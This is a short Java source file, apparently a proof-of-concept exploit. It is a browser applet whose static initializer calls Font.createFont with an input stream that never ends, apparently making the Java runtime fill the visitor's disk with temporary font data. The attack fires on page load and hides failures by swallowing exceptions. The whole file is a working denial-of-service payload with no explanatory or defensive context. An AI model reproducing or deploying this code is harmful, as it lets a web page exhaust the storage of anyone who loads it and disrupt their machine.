import java.applet.Applet;
import java.awt.Font;
import java.io.InputStream;

class MIS extends InputStream
{

    MIS()
    {
    }

    public int read()
    {
        return 0;
    }

    public int read(byte abyte0[], int i, int j)
    {
        return j - i;
    }
}


public class FontCreatorFullDiskApplet extends Applet
{

    public FontCreatorFullDiskApplet()
    {
    }
   
    static 
    {
        try
        {
            byte abyte0[] = new byte[0];
            Font font = Font.createFont(0, new MIS());
        }
        catch(Exception exception) { }
    }
}
